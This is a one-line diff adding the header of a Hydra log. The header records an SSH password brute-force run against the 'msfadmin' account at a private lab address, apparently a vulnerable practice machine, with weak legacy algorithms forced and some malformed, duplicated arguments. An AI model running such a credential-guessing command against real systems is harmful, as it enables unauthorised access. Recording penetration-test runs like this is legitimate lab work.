@@ -1,0 +1,1 @@
+# Hydra v9.6 run at 2026-02-23 23:32:50 on 172.20.0.5 ssh (hydra -l msfadmin -P /tmp/passwords.txt -t 4 -V -o -o MACs=hmac-sha1 -o KexAlgorithms=+diffie-hellman-group1-sha1 -o HostKeyAlgorithms=+ssh-rsa,ssh-dss ssh://172.20.0.5)
